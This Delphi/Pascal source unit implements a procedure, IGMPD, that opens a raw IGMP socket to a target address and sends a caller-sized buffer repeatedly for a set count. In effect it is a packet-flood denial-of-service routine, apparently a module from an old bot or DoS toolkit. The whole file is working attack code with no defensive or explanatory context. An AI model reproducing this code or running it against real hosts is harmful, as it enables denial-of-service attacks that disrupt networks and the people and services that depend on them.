   unit igmp;

   interface

   uses windows,winsock,sysutils;

   procedure IGMPD(TARGET,PACKET,NR,DELAY:STRING;PORT:iNTEGER);

   implementation

   procedure IGMPD(TARGET,PACKET,NR,DELAY:STRING;PORT:iNTEGER);
   var
      TargetAddr:TSockAddr;
      PacketSize:Integer;
      RawSocket:TSocket;
      b00m:pchar;
   begin

        RawSocket := socket( AF_INET, SOCK_RAW, IPPROTO_IGMP );

        if RawSocket = INVALID_SOCKET then begin
         exit;
        end;

        PacketSize := strtoint(PACKET);

        TargetAddr.sa_family := AF_INET;
        TargetAddr.sin_port := htons( PORT );
        TargetAddr.sin_addr.S_addr := inet_addr( pchar( TARGET ));

        if connect( RawSocket, TargetAddr, sizeof(TargetAddr)) <> 0 then begin
           closesocket( RawSocket );
           exit;
        end;
        getmem( b00m, PacketSize );

        if b00m = NIL then begin
           closesocket( RawSocket );
           exit;
        end;

   while strtoint(nr) > 0 do begin
        send( RawSocket, b00m, PacketSize, 0 );
        nr := inttostr(strtoint(nr) -1);
   end;

        FreeMem( b00m );
        closesocket( RawSocket );

   end;

   end.
